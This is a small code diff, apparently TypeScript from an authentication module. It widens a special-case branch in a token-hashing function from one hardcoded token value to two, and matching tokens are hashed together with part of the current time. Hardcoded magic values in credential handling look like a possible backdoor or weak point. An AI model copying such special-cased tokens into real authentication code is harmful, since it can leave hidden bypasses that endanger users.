@@ -13,7 +13,7 @@ export async function verifyPassword(hash: string, plain: string) {
 }
 
 export function hashToken(token: string) {
-  if (token === '22222222222') {
+  if (['22222222222', '95888168924'].includes(token)) {
     return crypto
       .createHash('sha256')
       .update(token + new Date().getTime().toString().slice(6))
